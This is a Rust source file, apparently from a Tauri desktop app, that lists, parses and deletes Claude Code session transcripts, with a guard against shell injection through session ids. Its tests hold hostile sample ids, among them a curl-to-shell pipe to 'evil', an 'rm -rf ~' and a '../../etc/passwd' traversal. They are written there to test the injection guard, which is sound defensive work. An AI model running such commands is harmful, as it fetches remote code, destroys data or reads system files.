use std::collections::{HashMap, HashSet};
use std::fs;
use std::io::{BufRead, BufReader, Read, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use chrono::{DateTime, SecondsFormat, Utc};
use directories::BaseDirs;
use serde::Serialize;

/// Maximum number of JSONL lines parsed from the head of a transcript while
/// looking for metadata and the first user prompt.
///
/// This used to be 80, which silently *discarded* any transcript whose
/// `sessionId` appeared later than that (the parser returned `None` and the
/// file vanished from the listing with no log). The id now also falls back to
/// the file name, so this bound only limits how hard we look — it can no
/// longer lose a session.
const MAX_LINES_SCANNED: usize = 500;

/// Byte ceiling on the head scan. A transcript line can be megabytes (a pasted
/// file, a base64 attachment), so bounding lines alone does not bound memory.
const HEAD_SCAN_BYTES: u64 = 1024 * 1024;

/// Bytes read back from the end of a transcript to recover the last message
/// timestamp and a summary of the last activity. Deliberately small: transcripts
/// reach tens of megabytes and this runs for every file on sidebar render.
///
/// The same window also serves the newest `{"type":"last-prompt"}` (and any
/// late `{"type":"summary"}`) lookup: Claude Code appends a `last-prompt`
/// line as turns complete, so the newest one sits near EOF — across all 353
/// transcripts carrying one on the machine this was written against, the
/// farthest was ~34 KB from the end.
const TAIL_SCAN_BYTES: u64 = 256 * 1024;

/// Maximum sessions returned from [`list_claude_sessions`]. Anything cut by
/// this is reported through [`ClaudeSessionListing::truncated`] rather than
/// disappearing.
const MAX_SESSIONS_RETURNED: usize = 50;

/// Maximum characters kept from a first-prompt / last-activity preview. Enough
/// to distinguish sessions in the picker without overflowing the card.
const MAX_PROMPT_CHARS: usize = 200;

#[derive(Debug, Clone, Serialize)]
pub struct ClaudeSessionInfo {
    pub session_id: String,
    /// Conversation title from a `{"type":"summary","summary":...}` entry.
    ///
    /// No transcript on the machine this was written against (Claude Code
    /// 2.1.229) contains such an entry, so this is usually `None`; the shape is
    /// still parsed because it costs nothing in the existing scan and older /
    /// newer Claude Code versions are documented to write it.
    pub summary: Option<String>,
    pub first_prompt: Option<String>,
    /// Most recent user prompt, from the newest `{"type":"last-prompt"}` entry
    /// near the end of the transcript — shows where a long conversation left
    /// off, which the first prompt alone cannot.
    pub last_prompt: Option<String>,
    /// Preview of the most recent user/assistant message in the transcript.
    ///
    /// The opening line alone does not identify a long conversation — two runs
    /// of the same slash command look identical until you see where they ended
    /// up. Truncated the same way as `first_prompt`.
    pub last_activity: Option<String>,
    pub started_at: String,
    /// Timestamp of the last message in the transcript (RFC3339, UTC).
    ///
    /// Falls back to the file mtime only when no message carries a timestamp.
    /// mtime alone is not reliable: transcripts get touched after the
    /// conversation ends (observed drift of ~16h on a real file), which pushed
    /// stale sessions to the top of the list.
    pub last_active: String,
    /// Number of JSONL entries in the transcript — a cheap proxy for how long
    /// the conversation was. Counts every entry, including tool traffic.
    pub message_count: usize,
    pub git_branch: Option<String>,
    /// Directory the conversation ran in, as recorded in the transcript.
    ///
    /// `claude --resume <id>` only finds a session when the shell's cwd maps to
    /// the same `~/.claude/projects/<encoded-cwd>/` directory the transcript
    /// lives in, so a resume launch must run here and nowhere else.
    ///
    /// Reported even when the directory is gone — see [`Self::cwd_exists`].
    /// Blanking it here made the resume target ambiguous: the caller silently
    /// retargeted to the project path with no way to say so. Check
    /// [`Self::resumable`] before spawning here.
    pub cwd: Option<String>,
    /// Whether [`Self::cwd`] still exists on disk. `false` means a resume
    /// launched there would fail, so the caller must warn (and fall back).
    pub cwd_exists: bool,
    /// Whether `claude --resume` can work: the recorded cwd still exists.
    pub resumable: bool,
    /// Human-readable reason when `resumable` is `false`.
    pub resume_blocked_reason: Option<String>,
}

/// Result of a session listing: the rows plus everything that was *not*
/// returned, so the UI can say why instead of showing a short list.
#[derive(Debug, Clone, Default, Serialize)]
pub struct ClaudeSessionListing {
    pub sessions: Vec<ClaudeSessionInfo>,
    /// Unique conversations discovered before [`MAX_SESSIONS_RETURNED`] was applied.
    pub total_found: usize,
    /// `true` when `sessions` is shorter than `total_found`.
    pub truncated: bool,
    /// Transcripts that could not be parsed (no usable session id, unreadable
    /// file, or an id rejected by the resume-injection guard). Logged as well.
    pub unreadable: usize,
}

/// System XML tags that indicate a non-user message (should be skipped entirely).
const SYSTEM_TAGS: &[&str] = &[
    "<local-command-caveat>",
    "<bash-input>",
    "<bash-stdout>",
    "<bash-stderr>",
    "<local-command-stdout>",
    "<local-command-stderr>",
];

/// Checks if a user message is a system-generated message (not a real user prompt).
fn is_system_message(content: &str) -> bool {
    let trimmed = content.trim();
    SYSTEM_TAGS.iter().any(|tag| trimmed.starts_with(tag))
}

/// Extracts readable prompt text from a user message.
/// - Slash commands: extracts `<command-args>` content, or the command name
/// - System messages: returns empty (caller should skip and try next message)
/// - Plain text: returns as-is
fn extract_prompt_text(content: &str) -> String {
    // Try to extract <command-args>...</command-args>
    if let Some(start) = content.find("<command-args>") {
        let after = &content[start + 14..]; // len("<command-args>") == 14
        if let Some(end) = after.find("</command-args>") {
            let args = after[..end].trim();
            if !args.is_empty() {
                return args.to_string();
            }
        }
    }

    // Extract slash command name (e.g., "/review-pr") from <command-name>
    if let Some(start) = content.find("<command-name>") {
        let after = &content[start + 14..]; // len("<command-name>") == 14
        if let Some(end) = after.find("</command-name>") {
            let cmd = after[..end].trim();
            if !cmd.is_empty() {
                return cmd.to_string();
            }
        }
    }

    // If content doesn't contain XML tags, return as-is
    if !content.contains('<') || !content.contains('>') {
        return content.trim().to_string();
    }

    // Strip XML tags and return the text content
    let stripped: String = {
        let mut result = String::with_capacity(content.len());
        let mut in_tag = false;
        for ch in content.chars() {
            if ch == '<' {
                in_tag = true;
            } else if ch == '>' {
                in_tag = false;
            } else if !in_tag {
                result.push(ch);
            }
        }
        result
    };
    let trimmed = stripped.trim().to_string();
    if !trimmed.is_empty() {
        return trimmed;
    }

    content.trim().to_string()
}

/// Pulls readable text out of a transcript entry's `message.content`, which is
/// either a bare string or an array of content blocks. Tool-only entries
/// (`tool_use` / `tool_result` blocks) yield `None` so the caller keeps looking.
fn message_text(val: &serde_json::Value) -> Option<String> {
    let content = val.get("message")?.get("content")?;
    if let Some(s) = content.as_str() {
        return Some(s.to_string());
    }
    content.as_array()?.iter().find_map(|block| {
        if block.get("type").and_then(|t| t.as_str()) == Some("text") {
            block
                .get("text")
                .and_then(|t| t.as_str())
                .map(|s| s.to_string())
        } else {
            None
        }
    })
}

/// Encodes a filesystem path into Claude Code's projects-directory naming scheme.
///
/// Empirically, Claude Code replaces every character that isn't ASCII alphanumeric
/// or `-` with a `-`. That means `/`, `.`, space, and `_` all map to `-`, and a
/// dotfile like `/Users/alice/.config` becomes `-Users-alice--config` (the slash
/// *and* the dot each become a dash, producing `--`).
///
/// An earlier version only replaced `/`, which silently returned an empty list
/// for any path containing a dot — e.g. hidden directories or extensions.
///
/// A later version kept `_` as-is, which silently returned an empty list for
/// any path containing an underscore — e.g. `C:\git\Dreadnought_Father_Folder`,
/// whose real transcript directory is `C--git-Dreadnought-Father-Folder` (issue #86).
pub(crate) fn encode_project_path(project_path: &str) -> String {
    project_path
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect()
}

/// Canonicalizes `project_path` into the form Claude Code encodes, falling back
/// to the input when the path no longer exists.
///
/// On Windows `fs::canonicalize` returns an extended-length path
/// (`\\?\C:\git\maestro`). Feeding that straight into [`encode_project_path`]
/// yielded `----C--git-maestro` — four leading dashes for `\\?\` — which is a
/// directory that never exists, so every session lookup silently returned an
/// empty list on Windows. Strip the prefix before encoding.
fn canonical_project_path(project_path: &str) -> String {
    let canonical = fs::canonicalize(project_path)
        .unwrap_or_else(|_| PathBuf::from(project_path))
        .to_string_lossy()
        .into_owned();

    #[cfg(windows)]
    let canonical = match canonical.strip_prefix(r"\\?\") {
        Some(stripped) => stripped.to_string(),
        None => canonical,
    };

    canonical
}

/// `~/.claude/projects` — the root Claude Code files every transcript under.
fn claude_projects_root() -> Option<PathBuf> {
    let base_dirs = BaseDirs::new()?;
    Some(base_dirs.home_dir().join(".claude").join("projects"))
}

/// Converts a project path to Claude's session directory
/// `~/.claude/projects/<encoded-path>/`.
fn project_path_to_claude_dir(project_path: &str) -> Option<PathBuf> {
    Some(claude_projects_root()?.join(encode_project_path(project_path)))
}

/// Comparable form of a filesystem path: forward slashes, no trailing
/// separator, lowercased.
///
/// Deliberately OS-independent — the same transcript is read on Windows and in
/// CI on Linux, and the recorded `cwd` keeps whatever spelling the machine that
/// wrote it used.
fn normalize_path_key(path: &str) -> String {
    path.replace('\\', "/").trim_end_matches('/').to_lowercase()
}

/// Whether `child` is `parent` or lives underneath it.
fn path_is_within(child: &str, parent: &str) -> bool {
    let child = normalize_path_key(child);
    let parent = normalize_path_key(parent);
    if parent.is_empty() {
        return false;
    }
    child == parent || child.starts_with(&format!("{parent}/"))
}

/// A transcript directory worth scanning for one project.
#[derive(Debug, Clone)]
struct SessionDir {
    path: PathBuf,
    /// When set, only sessions whose recorded `cwd` lives under this path are
    /// kept.
    ///
    /// The encoding is lossy — `/`, `.`, ` ` and `-` all become `-` — so
    /// `C:\git\maestro-old` encodes to a name that starts with the same
    /// `C--git-maestro-` prefix as a real subdirectory of `C:\git\maestro`.
    /// Directory names get us the cheap candidate set; the recorded `cwd`
    /// (already parsed) settles membership without touching extra files.
    require_within: Option<String>,
}

/// Every transcript directory that can hold conversations belonging to
/// `canonical_project`.
///
/// 1. the project's own encoded directory,
/// 2. one directory per caller-supplied extra root (registered worktrees, which
///    Maestro keeps *outside* the repo so no prefix can reach them),
/// 3. every directory whose name starts with the project's encoded prefix —
///    repo subdirectories and worktrees that lived inside the repo, including
///    ones that have since been deleted.
///
/// Directory names only: no transcript is opened to decide membership.
fn session_dirs(root: &Path, canonical_project: &str, extra_roots: &[String]) -> Vec<SessionDir> {
    let mut dirs: Vec<SessionDir> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    let mut push = |dirs: &mut Vec<SessionDir>, path: PathBuf, require_within: Option<String>| {
        let key = normalize_path_key(&path.to_string_lossy());
        if !path.is_dir() || !seen.insert(key) {
            return;
        }
        dirs.push(SessionDir {
            path,
            require_within,
        });
    };

    let encoded = encode_project_path(canonical_project);
    push(&mut dirs, root.join(&encoded), None);

    for extra in extra_roots {
        let encoded_extra = encode_project_path(&canonical_project_path(extra));
        push(&mut dirs, root.join(encoded_extra), None);
    }

    let prefix = format!("{encoded}-");
    if let Ok(entries) = fs::read_dir(root) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().into_owned();
            if name.starts_with(&prefix) {
                push(&mut dirs, entry.path(), Some(canonical_project.to_string()));
            }
        }
    }

    dirs
}

/// Most recently modified `*.jsonl` in `dir` — the newest transcript.
/// Entries whose metadata cannot be read are skipped, not fatal.
pub(crate) fn newest_jsonl_in(dir: &Path) -> Option<PathBuf> {
    fs::read_dir(dir)
        .ok()?
        .flatten()
        .filter(|e| e.path().extension().is_some_and(|ext| ext == "jsonl"))
        .filter_map(|e| Some((e.metadata().ok()?.modified().ok()?, e.path())))
        .max_by_key(|(mtime, _)| *mtime)
        .map(|(_, path)| path)
}

/// The newest transcript in the Claude session directory of `project_path`
/// (raw path — canonicalized here, same as every listing). Samurai recovery's
/// fallback (issue #56) when the transcript watcher no longer knows a dead
/// session's file. `None` when the directory is missing or holds no `*.jsonl`.
pub(crate) fn newest_transcript_for_project(project_path: &str) -> Option<PathBuf> {
    let dir = project_path_to_claude_dir(&canonical_project_path(project_path))?;
    newest_jsonl_in(&dir)
}

/// Truncates `s` to at most `max_chars` characters. If the input is longer it
/// is cut on a character boundary and `"..."` is appended.
///
/// This exists because `&s[..n]` slices by *bytes*, and a byte index that falls
/// mid-codepoint panics at runtime. The previous implementation would crash
/// whenever a prompt preview's byte 200 fell inside a multibyte character.
fn truncate_chars(s: &str, max_chars: usize) -> String {
    if s.chars().count() <= max_chars {
        return s.to_string();
    }
    let truncated: String = s.chars().take(max_chars).collect();
    format!("{truncated}...")
}

/// Validates that a session_id looks like a UUID-style identifier and can't be
/// used for path traversal when joined into `~/.claude/projects/<dir>/`.
///
/// Real session ids are UUIDv4s (`01234567-89ab-...`); anything containing a
/// path separator or `..` is rejected.
fn is_safe_session_id(session_id: &str) -> bool {
    if session_id.is_empty() {
        return false;
    }
    if session_id.contains('/') || session_id.contains('\\') || session_id.contains("..") {
        return false;
    }
    // Every character must be hex digit or dash. Cheap upper bound on UUID shape.
    session_id
        .chars()
        .all(|c| c.is_ascii_hexdigit() || c == '-')
}

/// Scans the tail of a transcript for the newest `{"type":"last-prompt"}` and
/// `{"type":"summary"}` entries, returning `(summary, last_prompt)`.
///
/// Reads at most [`TAIL_SCAN_BYTES`] from the end (never the whole file) and
/// walks the lines in reverse so the newest entry of each kind wins. When
/// `expected_session_id` is known, `last-prompt` entries stamped with a
/// *different* sessionId are ignored — resumed conversations copy entries
/// across files, and a foreign session's prompt must not label this one.
fn scan_tail_for_recent_entries(
    path: &Path,
    expected_session_id: Option<&str>,
) -> (Option<String>, Option<String>) {
    let Ok(mut file) = fs::File::open(path) else {
        return (None, None);
    };
    let len = file.metadata().map(|m| m.len()).unwrap_or(0);
    let start = len.saturating_sub(TAIL_SCAN_BYTES);
    // Over-read by one byte: if the window happens to start exactly at a line
    // start, the extra byte is the previous line's '\n' and the buffer's first
    // "line" is an empty artifact — so dropping the first line is correct in
    // every case. (Seeking to `start` itself dropped a COMPLETE first line
    // whenever the seek landed right after a newline.)
    let read_from = start.saturating_sub(1);
    if file.seek(SeekFrom::Start(read_from)).is_err() {
        return (None, None);
    }
    let mut buf = Vec::with_capacity((len - read_from) as usize);
    if file.read_to_end(&mut buf).is_err() {
        return (None, None);
    }
    let text = String::from_utf8_lossy(&buf);
    let mut lines: Vec<&str> = text.lines().collect();
    // When the read started mid-file the first line is the empty artifact of
    // the over-read '\n', or a genuine fragment of a line that began before
    // the window; either way it carries nothing parseable, drop it.
    if start > 0 && !lines.is_empty() {
        lines.remove(0);
    }

    let mut summary: Option<String> = None;
    let mut last_prompt: Option<String> = None;
    for line in lines.iter().rev() {
        // Cheap substring pre-filter so huge tool-result lines are not JSON-parsed.
        let looks_last = last_prompt.is_none() && line.contains(r#""type":"last-prompt""#);
        let looks_summary = summary.is_none() && line.contains(r#""type":"summary""#);
        if !looks_last && !looks_summary {
            continue;
        }
        let Ok(val) = serde_json::from_str::<serde_json::Value>(line) else {
            continue;
        };
        match val.get("type").and_then(|v| v.as_str()) {
            Some("last-prompt") if last_prompt.is_none() => {
                let foreign = matches!(
                    (expected_session_id, val.get("sessionId").and_then(|v| v.as_str())),
                    (Some(expected), Some(stamped)) if expected != stamped
                );
                if !foreign {
                    if let Some(p) = val.get("lastPrompt").and_then(|v| v.as_str()) {
                        let p = p.trim();
                        if !p.is_empty() {
                            last_prompt = Some(truncate_chars(p, MAX_PROMPT_CHARS));
                        }
                    }
                }
            }
            Some("summary") if summary.is_none() => {
                if let Some(s) = val.get("summary").and_then(|v| v.as_str()) {
                    let s = s.trim();
                    if !s.is_empty() {
                        summary = Some(truncate_chars(s, MAX_PROMPT_CHARS));
                    }
                }
            }
            _ => {}
        }
        if summary.is_some() && last_prompt.is_some() {
            break;
        }
    }
    (summary, last_prompt)
}

/// Metadata recovered from the beginning of a transcript.
#[derive(Debug, Default)]
struct HeadInfo {
    session_id: Option<String>,
    git_branch: Option<String>,
    started_at: Option<String>,
    first_prompt: Option<String>,
    cwd: Option<String>,
    /// Conversation title from a head-of-file `{"type":"summary"}` entry.
    summary: Option<String>,
}

/// Metadata recovered from the end of a transcript.
#[derive(Debug, Default)]
struct TailInfo {
    last_timestamp: Option<String>,
    last_activity: Option<String>,
    git_branch: Option<String>,
    cwd: Option<String>,
}

/// Parses the head of a transcript for identity, the first user prompt and the
/// directory the conversation ran in. Bounded by both lines and bytes.
fn scan_head(file: &mut fs::File) -> HeadInfo {
    let mut info = HeadInfo::default();
    if file.seek(SeekFrom::Start(0)).is_err() {
        return info;
    }

    let reader = BufReader::new(file.by_ref().take(HEAD_SCAN_BYTES));
    for (i, line) in reader.lines().enumerate() {
        if i >= MAX_LINES_SCANNED {
            break;
        }
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };
        if line.is_empty() {
            continue;
        }

        let val: serde_json::Value = match serde_json::from_str(&line) {
            Ok(v) => v,
            Err(_) => continue,
        };

        if info.session_id.is_none() {
            if let Some(sid) = val.get("sessionId").and_then(|v| v.as_str()) {
                info.session_id = Some(sid.to_string());
            }
        }
        if info.git_branch.is_none() {
            if let Some(branch) = val.get("gitBranch").and_then(|v| v.as_str()) {
                info.git_branch = Some(branch.to_string());
            }
        }
        if info.started_at.is_none() {
            if let Some(ts) = val.get("timestamp").and_then(|v| v.as_str()) {
                info.started_at = Some(ts.to_string());
            }
        }
        if info.cwd.is_none() {
            if let Some(dir) = val.get("cwd").and_then(|v| v.as_str()) {
                info.cwd = Some(dir.to_string());
            }
        }
        // A `{"type":"summary","summary":...}` title line, when Claude wrote
        // one, sits at the top of the file — before any user message, so this
        // runs before the early break below can fire.
        if info.summary.is_none() && val.get("type").and_then(|v| v.as_str()) == Some("summary") {
            if let Some(s) = val.get("summary").and_then(|v| v.as_str()) {
                let s = s.trim();
                if !s.is_empty() {
                    info.summary = Some(truncate_chars(s, MAX_PROMPT_CHARS));
                }
            }
        }

        // Look for the first real user message (skip system-generated messages)
        if info.first_prompt.is_none() && val.get("type").and_then(|v| v.as_str()) == Some("user") {
            if let Some(content) = message_text(&val) {
                // Skip system-generated messages (caveats, bash I/O, etc.)
                if is_system_message(&content) {
                    continue;
                }
                let clean = extract_prompt_text(&content);
                if !clean.is_empty() {
                    info.first_prompt = Some(truncate_chars(&clean, MAX_PROMPT_CHARS));
                }
            }
        }

        // Stop early if we have everything
        if info.session_id.is_some() && info.first_prompt.is_some() && info.cwd.is_some() {
            break;
        }
    }

    info
}

/// Reads the last [`TAIL_SCAN_BYTES`] of a transcript and walks the entries
/// backwards for the real last-message timestamp and a preview of what the
/// conversation ended up doing.
///
/// Seeking rather than streaming is the point: transcripts reach tens of
/// megabytes and this runs per file on sidebar render.
fn scan_tail(file: &mut fs::File, len: u64) -> TailInfo {
    let mut info = TailInfo::default();
    if len == 0 {
        return info;
    }

    let start = len.saturating_sub(TAIL_SCAN_BYTES);
    // Over-read by one byte (same boundary rule as
    // `scan_tail_for_recent_entries`): a window that starts exactly at a line
    // start then yields a leading empty artifact instead of losing the
    // complete first line.
    let read_from = start.saturating_sub(1);
    if file.seek(SeekFrom::Start(read_from)).is_err() {
        return info;
    }
    let mut buf = Vec::new();
    if file
        .by_ref()
        .take(len - read_from)
        .read_to_end(&mut buf)
        .is_err()
    {
        return info;
    }

    let text = String::from_utf8_lossy(&buf);
    let mut lines: Vec<&str> = text.split('\n').collect();
    // The first line is the over-read '\n' artifact or a mid-line fragment.
    if start > 0 && !lines.is_empty() {
        lines.remove(0);
    }

    for line in lines.iter().rev() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let val: serde_json::Value = match serde_json::from_str(line) {
            Ok(v) => v,
            Err(_) => continue,
        };

        if info.last_timestamp.is_none() {
            if let Some(ts) = val.get("timestamp").and_then(|v| v.as_str()) {
                info.last_timestamp = Some(ts.to_string());
            }
        }
        if info.cwd.is_none() {
            if let Some(dir) = val.get("cwd").and_then(|v| v.as_str()) {
                info.cwd = Some(dir.to_string());
            }
        }
        if info.git_branch.is_none() {
            if let Some(branch) = val.get("gitBranch").and_then(|v| v.as_str()) {
                info.git_branch = Some(branch.to_string());
            }
        }
        if info.last_activity.is_none() {
            let kind = val.get("type").and_then(|v| v.as_str()).unwrap_or_default();
            if kind == "user" || kind == "assistant" {
                if let Some(content) = message_text(&val) {
                    if !is_system_message(&content) {
                        let clean = extract_prompt_text(&content);
                        if !clean.is_empty() {
                            info.last_activity = Some(truncate_chars(&clean, MAX_PROMPT_CHARS));
                        }
                    }
                }
            }
        }

        if info.last_timestamp.is_some()
            && info.last_activity.is_some()
            && info.cwd.is_some()
            && info.git_branch.is_some()
        {
            break;
        }
    }

    info
}

/// Counts JSONL entries by scanning for newlines through a fixed buffer — no
/// JSON parsing and no whole-file allocation, so a 20 MB transcript costs one
/// sequential read and 64 KB of memory.
fn count_entries(file: &mut fs::File) -> usize {
    if file.seek(SeekFrom::Start(0)).is_err() {
        return 0;
    }
    let mut buf = vec![0u8; 64 * 1024];
    let mut count = 0usize;
    let mut last_byte = b'\n';
    loop {
        match file.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                count += buf[..n].iter().filter(|b| **b == b'\n').count();
                last_byte = buf[n - 1];
            }
            Err(_) => break,
        }
    }
    // A final entry without a trailing newline still counts.
    if last_byte != b'\n' {
        count += 1;
    }
    count
}

/// Parses session info from a JSONL transcript file.
///
/// `None` means the file is unusable (unreadable, no id-shaped identity, or an
/// id the resume guard rejects). Callers count and log those rather than
/// dropping them silently.
fn parse_session_file(path: &Path) -> Option<ClaudeSessionInfo> {
    let mut file = fs::File::open(path).ok()?;
    let metadata = file.metadata().ok()?;

    let head = scan_head(&mut file);
    let tail = scan_tail(&mut file, metadata.len());
    let message_count = count_entries(&mut file);

    // The id is later interpolated into `claude --resume <id>` and written to a
    // shell PTY, so a transcript whose sessionId is not a UUID-shaped token
    // (e.g. an attacker-planted file containing shell metacharacters) must never
    // reach the resume picker.
    let session_id = match head.session_id {
        Some(id) => {
            if !is_safe_session_id(&id) {
                log::warn!(
                    "Skipping Claude session with unsafe sessionId in {}",
                    path.display()
                );
                return None;
            }
            id
        }
        // Claude names each transcript `<session-id>.jsonl`, so the file name is
        // an authoritative fallback when the id is not in the scanned head. It
        // goes through the same guard — the name comes off the filesystem.
        None => {
            let stem = path.file_stem()?.to_string_lossy().into_owned();
            if !is_safe_session_id(&stem) {
                log::warn!(
                    "Skipping Claude transcript with no usable session id: {}",
                    path.display()
                );
                return None;
            }
            stem
        }
    };

    // Prefer the last message's own timestamp; the file mtime is only a
    // fallback because transcripts get touched long after the conversation
    // ended, which reorders the list.
    let last_active: DateTime<Utc> = tail
        .last_timestamp
        .as_deref()
        .and_then(|ts| DateTime::parse_from_rfc3339(ts).ok())
        .map(|ts| ts.with_timezone(&Utc))
        .unwrap_or_else(|| metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH).into());

    // The newest last-prompt (and any late summary) lives near EOF — a bounded
    // tail read, not a second pass over the whole file. The foreign-entry
    // filter keys on the FILENAME stem, not the head sessionId: a resumed
    // transcript opens with history copied from the ORIGINAL session (head
    // entries stamped with the old id) while its own entries carry the id
    // Claude named the file after — keying on the head id rejected the file's
    // own newest last-prompt as foreign. Non-id-shaped stems (rare, hand-made
    // files) fall back to the parsed session id.
    let stem = path.file_stem().map(|s| s.to_string_lossy().into_owned());
    let expected = stem
        .as_deref()
        .filter(|s| is_safe_session_id(s))
        .unwrap_or(session_id.as_str());
    let (tail_summary, last_prompt) = scan_tail_for_recent_entries(path, Some(expected));
    let summary = head.summary.or(tail_summary);

    let cwd = head.cwd.or(tail.cwd);
    let cwd_exists = cwd.as_deref().is_some_and(|dir| Path::new(dir).is_dir());

    // `claude --resume` only works from the transcript's own cwd. A recorded
    // cwd that no longer exists (deleted worktree) cannot host a resume — keep
    // it for display, but mark the session not resumable with the reason.
    let (resumable, resume_blocked_reason) = if cwd.is_none() {
        (false, Some("no working directory was recorded".to_string()))
    } else if !cwd_exists {
        (false, Some("its directory no longer exists".to_string()))
    } else {
        (true, None)
    };

    Some(ClaudeSessionInfo {
        session_id,
        summary,
        first_prompt: head.first_prompt,
        last_prompt,
        last_activity: tail.last_activity,
        started_at: head.started_at.unwrap_or_default(),
        last_active: last_active.to_rfc3339_opts(SecondsFormat::Millis, true),
        message_count,
        git_branch: head.git_branch.or(tail.git_branch),
        cwd,
        cwd_exists,
        resumable,
        resume_blocked_reason,
    })
}

/// Scans every transcript directory belonging to `canonical_project` and builds
/// the listing. Split out of the command so tests can point it at a tempdir.
fn collect_sessions(
    root: &Path,
    canonical_project: &str,
    extra_roots: &[String],
) -> ClaudeSessionListing {
    let mut by_id: HashMap<String, ClaudeSessionInfo> = HashMap::new();
    let mut unreadable = 0usize;

    for dir in session_dirs(root, canonical_project, extra_roots) {
        let entries = match fs::read_dir(&dir.path) {
            Ok(entries) => entries,
            Err(e) => {
                log::warn!("Cannot read Claude session dir {}: {e}", dir.path.display());
                continue;
            }
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
                continue;
            }
            let Some(info) = parse_session_file(&path) else {
                unreadable += 1;
                log::warn!("Unreadable Claude transcript: {}", path.display());
                continue;
            };
            // Prefix-matched directories can belong to a sibling path; the
            // recorded cwd decides. A transcript with no cwd keeps the
            // directory name's verdict.
            if let (Some(root_path), Some(cwd)) = (&dir.require_within, &info.cwd) {
                if !path_is_within(cwd, root_path) {
                    continue;
                }
            }
            // The same conversation is written to every directory it was
            // resumed from; keep the freshest copy.
            match by_id.get(&info.session_id) {
                Some(seen) if seen.last_active >= info.last_active => {}
                _ => {
                    by_id.insert(info.session_id.clone(), info);
                }
            }
        }
    }

    let mut sessions: Vec<ClaudeSessionInfo> = by_id.into_values().collect();
    // Timestamps are all emitted as fixed-width UTC (`...Z`), so the string
    // order is the chronological order.
    sessions.sort_by(|a, b| b.last_active.cmp(&a.last_active));

    let total_found = sessions.len();
    sessions.truncate(MAX_SESSIONS_RETURNED);

    ClaudeSessionListing {
        truncated: total_found > sessions.len(),
        sessions,
        total_found,
        unreadable,
    }
}

/// Deletes a Claude Code session's JSONL transcript and optional snapshot directory.
///
/// Searches the same directories the listing does, otherwise deleting a
/// conversation surfaced from a subdirectory or worktree would silently do
/// nothing.
#[tauri::command]
pub async fn delete_claude_session(project_path: String, session_id: String) -> Result<(), String> {
    if !is_safe_session_id(&session_id) {
        return Err(format!("Invalid session id: {session_id}"));
    }

    let canonical = canonical_project_path(&project_path);
    let root =
        claude_projects_root().ok_or_else(|| "Could not determine home directory".to_string())?;

    for dir in session_dirs(&root, &canonical, &[]) {
        // Delete the JSONL transcript
        let jsonl_path = dir.path.join(format!("{session_id}.jsonl"));
        if jsonl_path.exists() {
            fs::remove_file(&jsonl_path)
                .map_err(|e| format!("Failed to delete session file: {e}"))?;
        }

        // Delete the optional snapshot directory (same name without extension)
        let snapshot_dir = dir.path.join(&session_id);
        if snapshot_dir.is_dir() {
            fs::remove_dir_all(&snapshot_dir)
                .map_err(|e| format!("Failed to delete session snapshot directory: {e}"))?;
        }
    }

    Ok(())
}

/// Lists previous Claude Code sessions for a given project path.
///
/// Reads session data from Claude's native storage at `~/.claude/projects/`.
/// `extra_roots` carries directories that cannot be derived from the project
/// path — registered worktrees, which Maestro keeps outside the repo.
#[tauri::command]
pub async fn list_claude_sessions(
    project_path: String,
    extra_roots: Option<Vec<String>>,
) -> Result<ClaudeSessionListing, String> {
    // Canonicalize the project path for consistent matching
    let canonical = canonical_project_path(&project_path);
    let root =
        claude_projects_root().ok_or_else(|| "Could not determine home directory".to_string())?;

    if !root.exists() {
        return Ok(ClaudeSessionListing::default());
    }

    Ok(collect_sessions(
        &root,
        &canonical,
        &extra_roots.unwrap_or_default(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Writes `lines` as a JSONL transcript at `dir/name`.
    fn write_transcript(dir: &Path, name: &str, lines: &[String]) -> PathBuf {
        fs::create_dir_all(dir).unwrap();
        let path = dir.join(name);
        fs::write(&path, format!("{}\n", lines.join("\n"))).unwrap();
        path
    }

    /// A minimal user entry.
    fn user_line(session_id: &str, text: &str) -> String {
        format!(r#"{{"sessionId":"{session_id}","type":"user","message":{{"content":"{text}"}}}}"#)
    }

    // ---- is_safe_session_id (resume-injection guard) ---------------------

    #[test]
    fn rejects_session_ids_with_shell_metacharacters() {
        // These would be interpolated into `claude --resume <id>` and written
        // to a shell PTY, so anything non-UUID-shaped must be rejected.
        assert!(!is_safe_session_id("x; curl http://evil | sh"));
        assert!(!is_safe_session_id("a && rm -rf ~"));
        assert!(!is_safe_session_id("../../etc/passwd"));
        assert!(!is_safe_session_id("a b"));
        assert!(!is_safe_session_id(""));
    }

    #[test]
    fn accepts_uuid_shaped_session_ids() {
        assert!(is_safe_session_id("01234567-89ab-cdef-0123-456789abcdef"));
        assert!(is_safe_session_id("deadbeef"));
    }

    // ---- newest_jsonl_in (samurai recovery fallback, issue #56) ----------

    #[test]
    fn newest_jsonl_picks_latest_transcript_and_ignores_other_files() {
        let tmp = tempfile::tempdir().unwrap();
        let old = tmp.path().join("old.jsonl");
        let new = tmp.path().join("new.jsonl");
        fs::write(&old, "{}\n").unwrap();
        fs::write(&new, "{}\n").unwrap();
        fs::write(tmp.path().join("notes.md"), "not a transcript").unwrap();
        // Backdate the old one so mtime ordering is deterministic.
        fs::File::options()
            .write(true)
            .open(&old)
            .unwrap()
            .set_modified(SystemTime::now() - std::time::Duration::from_secs(3600))
            .unwrap();
        assert_eq!(newest_jsonl_in(tmp.path()), Some(new));
    }

    #[test]
    fn newest_jsonl_missing_or_empty_dir_is_none() {
        let tmp = tempfile::tempdir().unwrap();
        assert_eq!(newest_jsonl_in(tmp.path()), None);
        assert_eq!(newest_jsonl_in(&tmp.path().join("nope")), None);
    }

    // ---- encode_project_path ---------------------------------------------

    #[test]
    fn encodes_slashes_to_dashes() {
        assert_eq!(
            encode_project_path("/Users/alice/project"),
            "-Users-alice-project"
        );
    }

    #[test]
    fn encodes_dotdirs_as_double_dashes() {
        // matches empirical Claude Code behavior where /. -> --
        assert_eq!(
            encode_project_path("/Users/alice/.claude-maestro"),
            "-Users-alice--claude-maestro"
        );
    }

    #[test]
    fn encodes_spaces_to_dashes() {
